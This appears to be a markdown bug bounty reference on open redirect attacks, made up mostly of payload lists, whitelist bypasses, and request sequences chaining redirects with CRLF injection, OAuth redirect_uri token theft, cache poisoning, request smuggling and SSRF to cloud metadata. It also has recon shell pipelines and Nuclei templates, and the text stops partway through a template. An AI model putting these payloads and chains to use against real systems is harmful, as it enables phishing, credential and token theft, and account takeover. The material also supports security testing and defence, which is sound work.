# Open Redirect Advanced Knowledgebase

> **Research-grade reference for advanced bug bounty hunting and black-box testing**
> 
> Compiled from: PortSwigger Research, HackTricks, PayloadsAllTheThings, 
> Nuclei Templates, ProjectDiscovery tools, and real-world bug bounty findings.

---

## Table of Contents

1. [Basics](#basics)
2. [Open Redirect Theory](#open-redirect-theory)
3. [URL Parsing Internals](#url-parsing-internals)
4. [Open Redirect Payloads](#open-redirect-payloads)
5. [URL Parser Confusion Payloads](#url-parser-confusion-payloads)
6. [Whitelist Bypass Techniques](#whitelist-bypass-techniques)
7. [Double Slash Bypasses](#double-slash-bypasses)
8. [Backslash Bypasses](#backslash-bypasses)
9. [CRLF + Open Redirect Chains](#crlf--open-redirect-chains)
10. [OAuth + Open Redirect Chains](#oauth--open-redirect-chains)
11. [Cache Poisoning + Open Redirect Chains](#cache-poisoning--open-redirect-chains)
12. [Request Smuggling + Open Redirect Chains](#request-smuggling--open-redirect-chains)
13. [SSRF + Open Redirect Chains](#ssrf--open-redirect-chains)
14. [Parser Confusion Attacks](#parser-confusion-attacks)
15. [Browser Quirks](#browser-quirks)
16. [Gadget Chains](#gadget-chains)
17. [Real World Case Studies](#real-world-case-studies)
18. [Fuzzing Payloads](#fuzzing-payloads)
19. [Automation Workflows](#automation-workflows)
20. [Recon Methodology](#recon-methodology)
21. [Nuclei Templates](#nuclei-templates)
22. [Tools and Scanners](#tools-and-scanners)
23. [Advanced Research](#advanced-research)
24. [Bug Bounty Writeups](#bug-bounty-writeups)
25. [Payload Collections](#payload-collections)
26. [WAF Bypasses](#waf-bypasses)
27. [Detection Techniques](#detection-techniques)
28. [References](#references)

---

## Basics

### What is Open Redirect?

An open redirect vulnerability occurs when a web application or server uses **unvalidated, user-supplied input** to redirect users to other sites. This allows attackers to craft links to the vulnerable site that redirect to malicious sites of their choosing.

**Core Impact:**
- Phishing campaigns with trusted domain names
- Session theft via OAuth/token leakage
- Forced actions without user consent
- Chain with other vulnerabilities (XSS, SSRF, Cache Poisoning)

### Common Redirect Parameters

```
?checkout_url={payload}
?continue={payload}
?dest={payload}
?destination={payload}
?go={payload}
?image_url={payload}
?next={payload}
?redir={payload}
?redirect_uri={payload}
?redirect_url={payload}
?redirect={payload}
?return_path={payload}
?return_to={payload}
?return={payload}
?returnTo={payload}
?rurl={payload}
?target={payload}
?url={payload}
?view={payload}
/{payload}
/redirect/{payload}
```

### HTTP Redirection Status Codes

| Code | Meaning | Method Behavior |
|------|---------|----------------|
| 300 | Multiple Choices | Client chooses |
| 301 | Moved Permanently | Same method (usually) |
| 302 | Found (Temporary) | Same method (usually) |
| 303 | See Other | Always GET |
| 307 | Temporary Redirect | Same method guaranteed |
| 308 | Permanent Redirect | Same method guaranteed |

**Critical Note:** 307/308 preserve the HTTP method. If a POST receives 307, it will POST to the new location. This is exploitable for forcing password submission to attacker servers.

---

## Open Redirect Theory

### Attack Surface Classification

**1. Reflected Open Redirect**
- Redirect URL supplied in request parameter
- Immediate response with Location header
- Most common and easiest to detect

**2. Stored Open Redirect**
- Redirect URL stored in database/settings
- Triggered later by different action
- Harder to detect, often higher impact

**3. DOM-Based Open Redirect**
- JavaScript reads URL parameter and redirects
- No server-side validation
- Requires client-side exploitation

**4. Header-Based Redirect**
- Server uses headers like `X-Forwarded-Host` to build redirects
- Often combined with cache poisoning

### Redirect Methods

**Path-based Redirects:**
```
https://example.com/redirect/http://malicious.com
https://example.com/redirect/../http://malicious.com
```

**JavaScript-based Redirects:**
```javascript
// Vulnerable pattern
var redirectTo = "http://trusted.com";
window.location = redirectTo;

// Exploitation
?redirectTo=http://malicious.com
```

**Meta Refresh:**
```html
<meta http-equiv="refresh" content="0;url=http://evil.com">
```

---

## URL Parsing Internals

### URL Structure (WHATWG Standard)

```
https://user:pass@example.com:8080/path?query#fragment
|------|------|------|---------|----|------|------|--------|
scheme  username password host   port pathname search hash
```

### Critical Parser Differences

Different libraries parse URLs differently. These discrepancies are the root of most bypasses:

| Component | Python urllib | PHP parse_url | Java URI | Node.js url |
|-----------|--------------|---------------|----------|-------------|
| `http://evil.com@good.com` | evil.com | good.com | good.com | evil.com |
| `http://evil.com\@good.com` | varies | varies | varies | varies |
| `http://good.com:80@evil.com` | good.com | evil.com | good.com | good.com |

### The @ Symbol Authority Trick

The `@` character separates userinfo from host in URL authority:

```
http://legitimate.com@evil.com/path
```

- **Browser behavior**: Navigates to `evil.com` with username `legitimate.com`
- **Some validators**: Check `legitimate.com` (userinfo part)
- **Result**: Bypass if validator sees legitimate.com but browser goes to evil.com

### Unicode Normalization Attacks

```
https://evil.c℀.example.com  →  https://evil.ca/c.example.com
http://a.com／X.b.com          →  Different slash behavior
```

The character `℀` (U+2100) normalizes to `a/c` in some contexts.

### URL Encoding Edge Cases

```
//google%00.com        // Null byte truncation
/?redir=google。com     // Fullwidth dot (U+FF0E)
//google%E3%80%82com   // URL-encoded fullwidth dot
```

---

## Open Redirect Payloads

### Basic Payloads

```
//evil.com
///evil.com
////evil.com
https://evil.com
http://evil.com
//evil.com/
///evil.com/
//evil.com//
https:evil.com
http:evil.com
//evil.com/%2f..
//evil.com/%2f%2e%2e
```

### Protocol-Relative Payloads

```
//evil.com
\\evil.com
/\\evil.com
\\/evil.com
```

### Path Manipulation

```
/evil.com
//evil.com
///evil.com
/..\\evil.com
/.\\evil.com
//evil.com/
//evil.com//
/\/evil.com
/\\evil.com
```

### Query String Injection

```
?next=//evil.com
?redirect=http://evil.com
?url=https://evil.com
?return=//evil.com
?target=http://evil.com
```

### Fragment-Based (DOM-only)

```
#//evil.com
#https://evil.com
```

### Data URI Redirects

```
data:text/html,<script>location='http://evil.com'</script>
data:text/html;base64,PHNjcmlwdD5sb2NhdGlvbj0naHR0cDovL2V2aWwuY29tJzwvc2NyaXB0Pg==
```

### JavaScript Pseudo-Protocol

```
javascript:location.href='http://evil.com'
javascript:window.location='http://evil.com'
javascript:location.replace('http://evil.com')
```

### Meta Refresh Injection

```
http://evil.com/<meta http-equiv="refresh" content="0;url=http://evil.com">
```

---

## URL Parser Confusion Payloads

### Host Confusion via @ Symbol

```
http://legitimate.com@evil.com
http://legitimate.com:password@evil.com
http://legitimate.com%40evil.com
```

### Double @ Symbol

```
http://evil.com@legitimate.com@evil.com
```

Some parsers take the last @, others the first.

### Port Confusion

```
http://evil.com:80@legitimate.com
http://evil.com:443@legitimate.com
http://legitimate.com:80@evil.com
```

### Path as Host

```
http://evil.com/legitimate.com
http://evil.com?legitimate.com
http://evil.com#legitimate.com
```

### Backslash Confusion

```
http://evil.com\\legitimate.com
http://evil.com\\@legitimate.com
http://legitimate.com\\@evil.com
```

### Unicode/IDN Homograph

```
https://еxample.com  // Cyrillic 'е' (U+0435)
https://еxаmple.com  // Multiple Cyrillic chars
```

### Percent-Encoding Confusion

```
http://%65%76%69%6c.com          // 'evil' encoded
http://evil%2ecom                 // Dot encoded
http://evil%00.com                // Null byte
http://evil.com%00                // Null suffix
```

### Mixed Case Protocol

```
HtTp://evil.com
hTtPs://evil.com
HTTP://evil.com
```

### Tab/Newline Injection

```
http://evil.com%09%0d%0alegitimate.com
http://evil.com%0d%0aLocation:%20http://evil.com
```

---

## Whitelist Bypass Techniques

### 1. Subdomain Takeover

```
https://whitelisted.com.evil.com
https://evil.com/whitelisted.com
https://evil.com?whitelisted.com
```

If whitelist checks for `*.whitelisted.com`, use:
```
https://whitelisted.com.evil.com  // evil.com is the real host
```

### 2. Path-Based Bypass

```
https://whitelisted.com/evil.com
https://whitelisted.com/redirect/http://evil.com
```

### 3. @ Symbol Bypass

```
https://whitelisted.com@evil.com
https://evil.com@whitelisted.com  // Some parsers confused
```

### 4. Double Slash Bypass

```
https://whitelisted.com//evil.com
https://whitelisted.com///evil.com
```

### 5. Backslash Bypass

```
https://whitelisted.com\\evil.com
https://whitelisted.com\\@evil.com
```

### 6. Protocol Stripping

```
https:evil.com
//evil.com
\\evil.com
```

### 7. URL Encoding Bypass

```
https://whitelisted.com%2f%2fevil.com
https://whitelisted.com%5c%5cevil.com
```

### 8. Null Byte Bypass

```
https://whitelisted.com%00evil.com
```

### 9. HTTP Parameter Pollution

```
?next=whitelisted.com&next=evil.com
?url=whitelisted.com&url=evil.com
```

Some frameworks concatenate, some take last value.

### 10. Case Sensitivity Bypass

```
https://Whitelisted.Com@evil.com
https://whitelisted.COM@evil.com
```

### 11. Punycode/IDN Bypass

```
https://xn--whitelisted-6q4c.com  // If IDN converted
```

### 12. IPv6 Literal Bypass

```
http://[::ffff:evil.com]
http://[0:0:0:0:0:ffff:evil.com]
```

### 13. Localhost Bypass

```
http://localhost.evil.com
http://127.0.0.1.evil.com
http://0.0.0.0.evil.com
```

### 14. Data URI Bypass

```
data:text/html,<script>location='http://evil.com'</script>
```

### 15. JavaScript Protocol Bypass

```
javascript:location.href='http://evil.com'
```

---

## Double Slash Bypasses

### Basic Double Slash

```
//evil.com
///evil.com
////evil.com
```

### Protocol-Relative with Double Slash

```
https://example.com//evil.com
https://example.com///evil.com
```

### Path Traversal with Double Slash

```
https://example.com/..//evil.com
https://example.com/..///evil.com
```

### Query String with Double Slash

```
?next=//evil.com
?redirect=///evil.com
?url=////evil.com
```

### Fragment with Double Slash

```
#//evil.com
#///evil.com
```

### Encoded Double Slash

```
%2f%2fevil.com
%2f%2f%2fevil.com
%252f%252fevil.com  // Double-encoded
```

### Mixed Encoding

```
/%2f/evil.com
//%2fevil.com
```

---

## Backslash Bypasses

### Basic Backslash

```
\\evil.com
/\\evil.com
\\/evil.com
```

### Mixed Slash/Backslash

```
https://example.com/\\evil.com
https://example.com\\/evil.com
https://example.com\\evil.com
```

### Encoded Backslash

```
%5cevil.com
%5c%5cevil.com
%255c%255cevil.com
```

### Windows Path Style

```
https://example.com/C:\\evil.com
https://example.com/..\\evil.com
```

### @ with Backslash

```
https://example.com\\@evil.com
https://example.com/\\@evil.com
```

---

## CRLF + Open Redirect Chains

### CRLF Injection Basics

CRLF (`%0d%0a`) can inject headers, including `Location:` headers.

```
?redirect=http://example.com%0d%0aLocation:%20http://evil.com
```

### CRLF + Header Injection Chain

```
?url=http://example.com%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20302%20Found%0d%0aLocation:%20http://evil.com%0d%0aContent-Length:%200%0d%0a%0d%0a
```

### CRLF + Set-Cookie + Redirect

```
?redirect=http://example.com%0d%0aSet-Cookie:%20session=evil%0d%0aLocation:%20http://evil.com
```

### CRLF + XSS + Redirect

```
?redirect=http://example.com%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>location='http://evil.com'</script>
```

### HTTP Response Splitting via Open Redirect

```
GET /redirect?url=http://example.com%0d%0a%0d%0aHTTP/1.1%20302%20Found%0d%0aLocation:%20http://evil.com%0d%0aContent-Length:%200%0d%0a%0d%0a HTTP/1.1
Host: victim.com
```

---

## OAuth + Open Redirect Chains

### OAuth redirect_uri Attacks

**Basic redirect_uri manipulation:**
```
/authorize?client_id=xxx&redirect_uri=http://evil.com&response_type=code
```

**Path-based redirect_uri:**
```
/authorize?client_id=xxx&redirect_uri=https://legitimate.com/evil.com
```

**@ Symbol in redirect_uri:**
```
/authorize?client_id=xxx&redirect_uri=https://legitimate.com@evil.com
```

### OAuth Session Poisoning (CVE-2021-27582)

**Attack Flow:**
1. Victim visits attacker's page
2. Page redirects to OAuth with trusted `client_id`
3. Background request sends untrusted `client_id` with malicious `redirect_uri`
4. Session gets poisoned with malicious redirect
5. User approves trusted client → token sent to evil redirect

```
# Step 1: Trusted authorization
/authorize?client_id=trusted&redirect_uri=http://trusted.com&prompt=consent

# Step 2: Poison session
/authorize?client_id=evil&redirect_uri=http://evil.com

# Step 3: User approves trusted, gets redirected to evil
```

### Dynamic Client Registration SSRF

**Registration endpoint parameters containing URLs:**
```json
{
  "redirect_uris": ["http://evil.com"],
  "logo_uri": "http://evil.com/xss.html",
  "jwks_uri": "http://evil.com/keys.jwks",
  "sector_identifier_uri": "http://evil.com/uris.json",
  "request_uris": ["http://evil.com/request.jwt"]
}
```

**Second-order SSRF via logo_uri:**
1. Register client with malicious `logo_uri`
2. Server fetches logo during authorization display
3. SSRF triggered when user views consent page

### request_uri Parameter Abuse

```
/authorize?response_type=code%20id_token&client_id=xxx&request_uri=https://evil.com/malicious.jwt
```

The server fetches the JWT from attacker-controlled URL.

### OAuth + Open Redirect Chains

**Token Theft Chain:**
```
1. Find open redirect on legitimate.com: /redirect?url=//evil.com
2. Use as redirect_uri: /authorize?redirect_uri=https://legitimate.com/redirect?url=//evil.com
3. Authorization code/token delivered to evil.com
```

**Account Takeover Chain:**
```
1. Find open redirect on OAuth provider
2. Use in password reset: /reset?redirect_uri=https://provider.com/redirect?url=//evil.com
3. Reset token leaked to evil.com
```

---

## Cache Poisoning + Open Redirect Chains

### Web Cache Poisoning Basics

Cache poisoning turns reflected vulnerabilities into stored ones by poisoning the cache entry.

**Cache Key Components (typically):**
- HTTP method
- Path
- Query string
- Host header

**Unkeyed Components (exploitable):**
- Headers (X-Forwarded-Host, X-Original-URL)
- Cookies
- Body content

### Cache Key Transformation Attacks

**Port stripping:**
```
GET / HTTP/1.1
Host: example.com:1337

# Cache key becomes: example.com (port stripped)
# Response contains: Location: https://example.com:1337/
# Result: DoS or redirect to attacker port
```

**Query string exclusion:**
```
GET //?x=<script>alert(1)</script> HTTP/1.1
Host: example.com

# Query not in cache key
# XSS payload stored and served to all visitors of //
```

### Open Redirect as Cache Poisoning Gadget

```
GET /login?x=abc HTTP/1.1
Host: www.cloudflare.com

# Response: Location: /login/?x=abc
# Query string excluded from cache key
# Poison: GET /login?x=very-long-string... 
# Result: All /login requests get redirect with long string → 414 error
```

### Cache Parameter Cloaking

**Using ; as parameter delimiter (Ruby on Rails):**
```
GET /jsonp?callback=legit&utm_content=x;callback=alert(1)// HTTP/1.1

# Cache sees: callback=legit (only one keyed parameter)
# Application sees: callback=legit, utm_content=x, callback=alert(1)//
# Result: Second callback value used → XSS
```

### Fat GET Poisoning

```
GET /contact/report-abuse?report=albinowax HTTP/1.1
Host: github.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 22

report=innocent-victim

# Cache key: GET /contact/report-abuse?report=albinowax
# Backend processes body: report=innocent-victim
# Result: Cache stores response for innocent-victim
```

### CDN-Specific Cache Poisoning

**Akamai cache key injection:**
```
GET /?x=2 HTTP/1.1
Host: example.com
Origin: '-alert(1)-'__

# X-True-Cache-Key: /D/000/example.com/ cid=x=2__Origin='-alert(1)-'__

GET /?x=2__Origin='-alert(1)-' HTTP/1.1
Host: example.com

# Same cache key, but XSS in Origin header now exploitable
```

### Internal Cache Poisoning

**WP Rocket Cache (WordPress):**
```
GET /access-the-power-of-adobe-acrobat?dontpoisoneveryone=1 HTTP/1.1
Host: theblog.adobe.com
X-Forwarded-Host: collaborator-id.psres.net

# Internal fragment cache poisoned
# All pages now reference attacker domain for resources
```

---

## Request Smuggling + Open Redirect Chains

### HTTP Request Smuggling Basics

Desynchronize front-end and back-end about where requests end, allowing request prefix injection.

**CL.TE (Content-Length vs Transfer-Encoding):**
```
POST / HTTP/1.1
Host: example.com
Content-Length: 6
Transfer-Encoding: chunked

0

GPOST / HTTP/1.1
Host: example.com
```

**TE.CL:**
```
POST / HTTP/1.1
Host: example.com
Content-Length: 3
Transfer-Encoding: chunked

6
PREFIX
0

POST / HTTP/1.1
Host: example.com
```

### Request Smuggling + Open Redirect

**Grasping the DOM (RedHat case):**
```
POST /css/style.css HTTP/1.1
Host: www.redhat.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 122
Transfer-Encoding: chunked

0

POST /search?dest=../assets/idx?redir=//redhat.com@evil.net/ HTTP/1.1
Host: www.redhat.com
Content-Length: 15

x=
```

Victim request:
```
GET /en/solutions HTTP/1.1
Host: www.redhat.com
```

Result: Victim gets 301 to `../assets/idx?redir=//redhat.com@evil.net/` which triggers DOM-based open redirect to evil.net.

### CDN Chaining + Request Smuggling

```
POST /cow.jpg HTTP/1.1
Host: redacted.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 50
Transfer-Encoding: chunked

0

GET / HTTP/1.1
Host: www.redhat.com
X: X
```

Result: Serve content from anywhere on Akamai network on victim's website.

### CL.0 Desync + Open Redirect

```
POST /b/ HTTP/2
Host: www.amazon.com
Content-Length: 23

GET /404 HTTP/1.1
X: X
```

Back-end ignores Content-Length, treats body as new request. Can redirect arbitrary victim requests.

### Browser-Powered Desync (CSD)

```javascript
fetch('https://example.com/', {
    method: 'POST',
    body: "GET /hopefully404 HTTP/1.1\r\nX: Y",
    mode: 'no-cors',
    credentials: 'include'
}).then(() => {
    location = 'https://example.com/'
})
```

Poison browser's connection pool, then navigate to trigger harmful response.

---

## SSRF + Open Redirect Chains

### Open Redirect → SSRF

Many SSRF protections only validate initial URL. If redirect is followed, internal targets become accessible.

```
# Attacker provides:
https://public-api.com/fetch?url=https://allowed.com/redirect?to=http://internal.admin

# allowed.com redirects to http://internal.admin
# SSRF achieved through open redirect
```

### URL Parser Confusion → SSRF

```
http://127.0.0.1:80@evil.com  # Some parsers see 127.0.0.1
http://localhost@evil.com      # Some parsers see localhost
```

### IPv6/IPv4 Confusion

```
http://[::ffff:127.0.0.1]      # IPv6 mapped IPv4
http://[0:0:0:0:0:ffff:127.0.0.1]
http://0177.0.0.01             # Octal IP
http://0x7f.0.0.1              # Hex IP
```

### DNS Rebinding via Open Redirect

```
1. Attacker controls dns.evil.com
2. First query resolves to allowed external IP
3. Second query resolves to 127.0.0.1
4. Open redirect chains to internal target
```

### Cloud Metadata via Open Redirect

```
# AWS
http://169.254.169.254/latest/meta-data/

# GCP  
http://metadata.google.internal/computeMetadata/v1/

# Azure
http://169.254.169.254/metadata/instance?api-version=2017-08-01
```

Chain: Open Redirect → SSRF → Cloud Metadata → Credential Theft

---

## Parser Confusion Attacks

### Host Header Parser Confusion

```
GET / HTTP/1.1
Host: example.com:80@evil.com

# Some parsers: host=example.com, port=80, userinfo=@evil.com (invalid)
# Other parsers: host=evil.com, userinfo=example.com:80
```

### X-Forwarded-Host Confusion

```
GET / HTTP/1.1
Host: example.com
X-Forwarded-Host: evil.com

# Application uses X-Forwarded-Host for redirects
# Result: Redirect to evil.com
```

### Multiple Host Headers

```
GET / HTTP/1.1
Host: example.com
Host: evil.com

# Some parsers: first wins
# Some parsers: last wins
# Some parsers: concatenate
```

### Absolute URI in Request Line

```
GET http://evil.com/ HTTP/1.1
Host: example.com

# Some proxies use request line URI
# Some use Host header
# Result: Request routing confusion
```

### Path Normalization Confusion

```
GET /admin%2f..%2f..%2fetc%2fpasswd HTTP/1.1
Host: example.com

# Proxy normalizes: /etc/passwd
# Backend doesn't normalize: /admin/../../etc/passwd
```

---

## Browser Quirks

### Safari HSTS Auto-Upgrade

If attacker domain is in Safari's HSTS cache, HTTP redirects are auto-upgraded to HTTPS. This bypasses mixed-content blocking.

```
# Attacker serves HTTP redirect
# Safari upgrades to HTTPS automatically
# Mixed-content protection bypassed
```

### Edge Mixed-Content Bypass

Edge completely bypasses mixed-content protection when receiving 302 redirect to HTTPS URL.

### Internet Explorer Mixed-Content

IE's mixed-content protection can be completely bypassed.

### Chrome Cache Partitioning Bypass

Top-level navigation is required to poison the correct cache partition. `fetch()` poisons the wrong partition.

```javascript
// Wrong - poisons wrong cache
fetch('https://target/resource.js', {mode: 'no-cors'})

// Right - top-level navigation
location = 'https://target/resource.js'
```

### Firefox SHIELD System

Firefox's SHIELD system fetches recipes from configured URL. If X-Forwarded-Host poisons the URL, Firefox fetches attacker-controlled recipes.

```
GET /api/v1/ HTTP/1.1
Host: normandy.cdn.mozilla.net
X-Forwarded-Host: evil.com

# Response contains poisoned recipe URLs
# Firefox fetches recipes from evil.com
```

### Browser Connection Pools

Chrome maintains separate connection pools for:
- Requests with cookies
- Requests without cookies

Must poison the correct pool:
```javascript
fetch('https://target/', {
    credentials: 'include'  // Poison 'with-cookies' pool
})
```

### Stacked Response Problem

Browsers discard connections if they receive more response data than expected. This affects multi-response techniques.

**Mitigation:** Use cache-buster to delay response, or pad with lengthy headers.

---

## Gadget Chains

### Host-Header Redirect Gadget

```
GET /+webvpn+/ HTTP/1.1
Host: psres.net

# Response: 302 Location: https://psres.net/+webvpn+/
```

Used in client-side cache poisoning attacks.

### HEAD Method Gadget

```
HEAD /404/?cb=123 HTTP/1.1
Host: www.capitalone.ca

# Response has headers but no body
# Next response's headers become "body" of HEAD response
# Can splice malicious HTML into response stream
```

### CSS Import Gadget

```
GET /style.css?x=a);@import... HTTP/1.1

# Response: @import url(/site/home/index.css?x=a);@import...
# Inject malicious CSS that exfiltrates data from pages that load it
```

### JSONP Gadget

```
GET /jsonp?callback=legit HTTP/1.1

# Response: legit({data})
# If callback controlled: alert(1)({data})
```

### Open Graph Hijacking

```
<meta property="og:url" content='https://evil.com/en'/>

# Anyone sharing poisoned page shares attacker's content
```

### Translation File Gadget

```
GET /api/i18n/en HTTP/1.1
Host: evil.com

# Response: {"Show more":"<svg onload=alert(1)>"}
# When target loads this, any "Show more" text triggers XSS
```

### Error Page Gadget

```
GET /foo.css?x=alert(1)%0A{}*{color:red;} HTTP/1.1

# 200 response with HTML error containing CSS
# If page importing CSS has no doctype, browser executes CSS
```

---

## Real World Case Studies

### Case Study 1: PayPal Login Page Compromise

**Vulnerability Chain:**
1. Request smuggling on `c.paypal.com`
2. Cache poisoning of JS file: `fb-all-prod.pp2.min.js`
3. CSP bypass via iframe sub-page
4. Password theft from parent page

**Key Technique:**
```
POST /webstatic/r/fb/fb-all-prod.pp2.min.js HTTP/1.1
Host: c.paypal.com
Content-Length: 61
Transfer-Encoding: chunked

0

GET /webstatic HTTP/1.1
Host: skeletonscribe.net?
X: X
```

**Result:** Persistent JS hijack on login page → full credential theft.

### Case Study 2: Cloudflare 24M Site Takeover

**Vulnerability:** H2.0 desync internal to Cloudflare infrastructure

**Attack:**
```
GET /assets/icon.png HTTP/2
Host: <redacted>

GET /assets HTTP/1.1
Host: psres.net
X: y
```

**Impact:** Poisoned cache entries affected random third-party sites.

### Case Study 3: New Relic Internal API Access

**Chain:**
1. Request smuggling via `Transfer-Encoding: cow`
2. Header reflection to discover internal headers
3. `Service-Gateway-Account-Id` + `Service-Gateway-Is-Newrelic-Admin`
4. Full admin access to internal API

### Case Study 4: MITREid Connect OAuth SSRF

**Vulnerability:** `logo_uri` in dynamic client registration

**Exploit:**
```json
POST /register HTTP/1.1
Content-Type: application/json

{
  "redirect_uris": ["http://artsploit.com/redirect"],
  "logo_uri": "http://artsploit.com/xss.html"
}
```

**Trigger:** `GET /api/clients/{id}/logo` → fetches attacker URL → SSRF + XSS

### Case Study 5: Yahoo Traffic Server Admin Access

**Vulnerability:** Invalid Host header → routing to admin interface

**Exploit:**
```
GET / HTTP/1.1
Host: XX.X.XXX.XX:8082
```

**Result:** Access to Traffic Server Overseer Port with full configuration control.

### Case Study 6: GitHub Fat GET Account Takeover

**Vulnerability:** Varnish + Rails fat GET processing

**Exploit:**
```
GET /contact/report-abuse?report=albinowax HTTP/1.1
Host: github.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 22

report=innocent-victim
```

**Result:** Cache poisoned to report innocent victim instead.

---

## Fuzzing Payloads

### Comprehensive Payload List

```
// Basic protocols
http://evil.com
https://evil.com
//evil.com
///evil.com
////evil.com
\\evil.com
\\/evil.com
/\\evil.com

// @ symbol variations
https://evil.com@legitimate.com
https://legitimate.com@evil.com
https://evil.com:80@legitimate.com
https://evil.com:443@legitimate.com
https://legitimate.com:80@evil.com

// Path variations
https://legitimate.com/evil.com
https://legitimate.com//evil.com
https://legitimate.com///evil.com
https://legitimate.com/..\\evil.com
https://legitimate.com/.\\evil.com

// Query variations
?next=//evil.com
?next=https://evil.com
?next=http://evil.com
?redirect=//evil.com
?redirect_uri=//evil.com
?url=//evil.com
?return=//evil.com
?return_to=//evil.com

// Encoding variations
%2f%2fevil.com
%2f%2f%2fevil.com
%252f%252fevil.com
%5cevil.com
%5c%5cevil.com
%255c%255cevil.com

// Unicode variations
//evil。com
//evil％2ecom
//evil%00.com

// Data URI
data:text/html,<script>location='http://evil.com'</script>

// JavaScript
javascript:location.href='http://evil.com'
javascript:window.location='http://evil.com'
javascript:location.replace('http://evil.com')

// Meta refresh
<meta http-equiv="refresh" content="0;url=http://evil.com">

// Protocol stripping
https:evil.com
http:evil.com
//evil.com
\\evil.com

// Double slash with backslash
/\\/evil.com
\\/evil.com
/\\evil.com

// Null byte
//evil%00.com
//evil.com%00

// CRLF injection
http://evil.com%0d%0aLocation:%20http://evil.com

// Parameter pollution
?next=legitimate.com&next=evil.com
?url=legitimate.com&url=evil.com

// IPv6
http://[::ffff:evil.com]
http://[0:0:0:0:0:ffff:evil.com]

// Localhost bypass
http://localhost.evil.com
http://127.0.0.1.evil.com
http://0.0.0.0.evil.com

// IDN/Punycode
https://xn--evl-6cd.com
```

### Parameter Name Fuzzing

```
?redirect={payload}
?redirect_to={payload}
?redirect_url={payload}
?redirect_uri={payload}
?return={payload}
?return_to={payload}
?return_url={payload}
?url={payload}
?next={payload}
?target={payload}
?dest={payload}
?destination={payload}
?go={payload}
?link={payload}
?href={payload}
?action={payload}
?path={payload}
?site={payload}
?uri={payload}
?continue={payload}
?checkout_url={payload}
?image_url={payload}
?rurl={payload}
?view={payload}
```

---

## Automation Workflows

### Recon Automation

```bash
# Step 1: Subdomain enumeration
subfinder -d target.com -o subs.txt

# Step 2: Probe for live hosts
cat subs.txt | httpx -o live.txt

# Step 3: Crawl for redirect parameters
cat live.txt | katana -d 5 -o crawl.txt

# Step 4: Extract URLs with redirect parameters
grep -iE "(redirect|return|next|url|target|dest)=http" crawl.txt > redirect_params.txt

# Step 5: Fuzz with open redirect payloads
nuclei -l redirect_params.txt -t open-redirect.yaml
```

### Continuous Monitoring

```bash
# Monitor for new redirect parameters
# Run daily via cron

#!/bin/bash
DATE=$(date +%Y%m%d)
subfinder -d target.com | anew subs.txt | \
    httpx | anew live.txt | \
    katana -d 3 | anew crawl.txt | \
    grep -iE "(redirect|return|next|url|target|dest)=http" | \
    anew redirect_params.txt | \
    nuclei -t open-redirect.yaml -o findings_$DATE.txt
```

### Mass Fuzzing Pipeline

```bash
# Using ffuf for parameter discovery
ffuf -u https://target.com/FUZZ -w /path/to/parameters.txt -mc 302,301

# Using qsreplace for payload injection
cat urls.txt | qsreplace "//evil.com" | xargs -I {} curl -s -o /dev/null -w "%{http_code} {}\n" {} | grep "30[12]"
```

---

## Recon Methodology

### Phase 1: Asset Discovery

1. **Subdomain Enumeration**
   ```bash
   subfinder -d target.com -all -o subs.txt
   amass enum -d target.com -o amass.txt
   assetfinder --subs-only target.com
   ```

2. **URL Collection**
   ```bash
   cat subs.txt | httpx -o live.txt
   cat live.txt | katana -d 5 -jc -o crawl.txt
   gau target.com > gau.txt
   waybackurls target.com > wayback.txt
   ```

3. **Parameter Extraction**
   ```bash
   cat crawl.txt gau.txt wayback.txt | \
       grep -iE "[?&](redirect|return|next|url|target|dest|go|continue|redirect_uri|redirect_url|return_to|return_path|rurl|view|link|href|action|path|site|uri|checkout_url|image_url)=" > params.txt
   ```

### Phase 2: Target Identification

**High-value targets:**
- Login pages with `return_to` or `next`
- OAuth authorization endpoints with `redirect_uri`
- Payment flows with `checkout_url`
- Admin panels with `redirect` after auth
- Mobile app deep links
- SSO endpoints
- Password reset flows

**JavaScript analysis:**
```bash
# Extract JavaScript files
cat crawl.txt | grep "\.js$" > js.txt

# Search for redirect patterns
cat js.txt | xargs -I {} curl -s {} | grep -iE "(location\.href|location\.replace|window\.location|redirect)"
```

### Phase 3: Testing Strategy

1. **Manual verification** of promising targets
2. **Automation** with nuclei/ffuf
3. **Chain exploration** with other vulnerabilities
4. **Impact assessment** for report severity

---

## Nuclei Templates

### Basic Open Redirect Template

```yaml
id: open-redirect-basic

info:
  name: Basic Open Redirect
  author: your-name
  severity: medium
  description: Detects open redirect via common parameters
  tags: redirect, oob

requests:
  - method: GET
    path:
      - "{{BaseURL}}/redirect?url=https://{{interactsh-url}}"
      - "{{BaseURL}}/redirect?next=https://{{interactsh-url}}"
      - "{{BaseURL}}/redirect?return=https://{{interactsh-url}}"
      - "{{BaseURL}}/redirect?redirect=https://{{interactsh-url}}"
      - "{{BaseURL}}/redirect?redirect_uri=https://{{interactsh-url}}"
      - "{{BaseURL}}/redirect?return_to=https://{{interactsh-url}}"
      - "{{BaseURL}}/redirect?target=https://{{interactsh-url}}"
      - "{{BaseURL}}/redirect?dest=https://{{interactsh-url}}"
      - "{{BaseURL}}/redirect?destination=https://{{interactsh-url}}"
      - "{{BaseURL}}/redirect?go=https://{{interactsh-url}}"
      - "{{BaseURL}}/redirect?checkout_url=https://{{interactsh-url}}"
      - "{{BaseURL}}/redirect?image_url=https://{{interactsh-url}}"
      - "{{BaseURL}}/redirect?rurl=https://{{interactsh-url}}"
      - "{{BaseURL}}/redirect?view=https://{{interactsh-url}}"
      - "{{BaseURL}}/redirect?continue=https://{{interactsh-url}}"

    matchers-condition: or
    matchers:
      - type: word
        part: header
        words:
          - "Location: https://{{interactsh-url}}"
          - "Location: http://{{interactsh-url}}"
          - "Location: //{{interactsh-url}}"
        condition: or

      - type: regex
        part: header
        regex:
          - '(?m)^(?:Location\s*?:\s*?)(?:https?:\/\/|\/\/|\/\/)?({{interactsh-url}})\/?\r?$'
```

### Advanced Bypass Template

```yaml
id: open-redirect-bypass

info:
  name: Open Redirect Bypass
  author: your-name
  severity: medium
  description: Tests various open redirect bypass techniques

requests:
  - method: GET
    path:
      # @ symbol bypass
      - "{{BaseURL}}/redirect?url=https://{{Hostname}}@{{interactsh-url}}"
      - "{{BaseURL}}/redirect?url=https://{{interactsh-url}}@{{Hostname}}"

